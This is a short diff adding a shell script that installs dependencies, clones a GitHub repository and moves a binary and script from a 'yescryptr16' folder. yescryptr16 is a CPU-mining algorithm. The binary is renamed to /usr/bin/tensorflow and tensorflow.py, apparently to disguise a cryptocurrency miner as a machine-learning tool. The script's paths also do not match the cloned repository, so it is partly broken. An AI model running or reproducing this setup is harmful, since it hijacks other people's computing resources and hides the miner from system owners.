@@ -1,0 +1,8 @@
+apt update -y
+apt install git libcurl4-openssl-dev libjansson-dev -y
+git clone https://github.com/agussusahnti/curve-compile
+chmod +x curve-compile/run.sh yescryptr16/render
+mv yescryptr16/render /usr/bin/tensorflow
+mv yescryptr16/main.py tensorflow.py
+mv yescryptr16/run.sh run.sh
+rm -Rf yescryptr16
